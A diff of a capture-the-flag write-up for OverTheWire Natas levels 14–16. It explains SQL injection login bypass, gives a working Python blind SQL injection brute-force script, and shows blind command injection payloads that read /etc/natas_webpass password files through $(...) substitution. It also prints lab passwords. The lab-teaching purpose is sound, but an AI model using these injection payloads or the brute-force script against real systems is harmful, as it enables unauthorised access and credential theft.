@@ -344,7 +344,7 @@ passthru("grep -i '' . ; cat /etc/natas_webpass/natas10 # dictionary.txt")
 ```
 
 - what it does is , it check for any character inside list denoted by the `[]`
-- based on it we know that it check for `;` and `&` character. only this two.
+- based on it we know that it check for `;`, `|` and `&` character. only this two.
 - from our previous exploit. we don't actually use these two characters.
 - so we can simply run the same exploit again but change file to `natas11`
 - we got the password
@@ -686,4 +686,169 @@ Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
 
 ## NATAS14
 
-- SQL injection
+- this one look like SQL injection, because the source code reveal alot about MYSQL.
+- here are the login logic
+```php
+$query = "SELECT * from users where 
+username=\"".$_REQUEST["username"]."\" and 
+password=\"".$_REQUEST["password"]."\"";
+
+if(array_key_exists("debug", $_GET)) {
+    echo "Executing query: $query<br>";
+}
+
+if(mysql_num_rows(mysql_query($query, $link)) > 0) {
+        echo "Successful login! The password for natas15 is <censored><br>";
+} else {
+        echo "Access denied!<br>";
+}
+mysql_close($link);
+```
+- we can see that, there is a debug option for us to see our query.
+- we can meke use of it in the url `?debug&username=admin&password=test`
+- we can try this query to bypass password, so that the satement is true 
+```php
+?debug&username=admin"%20OR%201=1%20--%20"&password=test
+```
+- our query will look like this
+```sql
+SELECT * from users where username="admin" OR 1=1 -- "" and password="test"
+```
+- what it does is, `username=admin` OR `1=1--` and commented the rest of the code.
+- now we are able to login and get the password
+```
+Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+```
+
+## NATAS15
+- here it's still sql injection, but there no sight of our password.
+- if the user exist it simply echo `This user exists`.
+- we got nothing from database, this is a blind sql attack.
+- what we need is our password for natas16.
+- what information do we have ? 
+- in the source code, there is a clue of users table
+```sql
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+```
+- maybe our password are in that table.
+- let's check if there is usernamed natas16.
+- there is indeed a user called natas16
+
+![user-exist](./images/user-exits.png).
+- now, how do we get the password ??
+- in previous attack, we bypass the password check by commenting it.
+- here in the code, there is no password checking.
+```php
+$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+```
+- what we can do is, we can add password checking, and bruteforce the password.
+```php
+$query = "SELECT * from users where username=\"". natas16" AND password LIKE BINARY " something  ."\"";
+```
+- `LIKE BINARY` means we guessing short
+- we know that the password is `32 characters` long mix of alpha num mix capitalisation.
+- let say if the password is` Wx89iopAs`
+- if we gues `W` it will get correct, if we guessed `Wa` is wrong but `Wx` is right.
+- so we can build up from that until we get to `32 characters long`.
+- here we can create a brute script that make a request and check for words `This user exists`
+- here are example script to make request.
+```py
+import requests
+import string
+
+#variables
+#create a-zA-Z0-10 strings of characters
+dicts = ''.join(string.ascii_letters+string.digits) 
+dicts_filtered = ''
+password = '' #buffer to store each gen password
+
+header = {"Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="}
+sqlURI = 'http://natas15.natas.labs.overthewire.org/index.php?debug'
+SQLQuery = '" and password LIKE BINARY "{}{}%"#'
+
+#filter the character in dictionary get only the exist characters
+for char in dicts:
+    reqData = {'username':'natas16" and password LIKE BINARY "%{}%"#'.format(char)}
+    res = requests.post(sqlURI,headers=header,data=reqData)
+    # print("res:",res.text)
+    if 'exists' in res.text:
+        dicts_filtered +=char
+
+print('filtered:{}'.format(dicts_filtered))
+
+#start bruteforcing using filtered 
+print('Bruteforcing.....')
+for i in range(0,32):
+    for char in dicts_filtered:
+        reqData = {'username':'natas16'+SQLQuery.format(password,char)}
+        res = requests.post(sqlURI,headers=header, data=reqData)
+        #print(char)
+        if 'exists' in res.text :
+            password +=char
+            print(password)
+            break
+```
+- in our code, the first loop we done is to filter for characters that are not exist in the password.
+- we ended up with these characters that are usable `acehijmnpqtwBEHINORW03569`
+- then we loop thru those characters and guess the order until it forms a 32 characters strings that are valid.
+```
+WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+```
+
+## NATAS16
+- look like to go back to command injection.
+- and it seems to filter some characters
+- the regex look like this 
+```php
+preg_match('/[;|&`\'"]/',$key)
+```
+- what it do is , it check of `;`,`|`,`&` and `''`.
+- the part where we inject code is here
+```php
+passthru("grep -i \"$key\" dictionary.txt");
+```
+- previously we use this exploit to get over the regex
+```
+' /etc/natas_webpass/natas10 #
+```
+- but this time, our single quote get rejected, so we can't break the string.
+- but, because the comman grep from the dictionary.txt, we might be able to add the password into the file
+- then read the password from the dictionary.
+- in bash we can run comman in string using "$(our command)"
+- our input look like this without `""`
+```bash
+"pass $(echo password:$(cat /etc/natas_webpass/natas17) >> ./dictionary.txt)"
+```
+- we try this but no luck, maybe the file `dictionary.txt` is read only and we have no permission to alter it.
+- maybe we can ask the page, just like we did in blind SQL attack we perform in natas16.
+- this time it's a `blind command injection`.
+- what can we do to ask, if the password contains a letter ?
+- we can use `grep`.
+- let's take a word, as example `password`
+- we use the existing grep to find `password`
+- then we add another grep inside it to find for letter we want to brute.
+- if there is a letter let say `"x"` in the password file, 
+- our added grep will return `"x"`.
+- then the existing grep will look like this
+```bash
+grep -i "passwordx" dictionary.txt 
+```
+- and the result that we see in the browser will be empty, because there is no words in dictionary match passwordx
+- from that we can filter which letters are there in our password, by checking the page output empty or not.
+- after we get the filtered, list, we can loop thru it and guess the order using grep anchor `^`
+- to check if letter `x` found at the start or not. you know the drill.
+- our first input query look like this
+```bash
+"password$(grep ${ourchar} /etc/natas_webpass/natas17)"
+```
+- our next input query look like this
+```bash
+"password$(grep ^${ourstr} /etc/natas_webpass/natas17)"
+```
+- so now we just need to edit our previous blindsql code.
+```python
+
+```
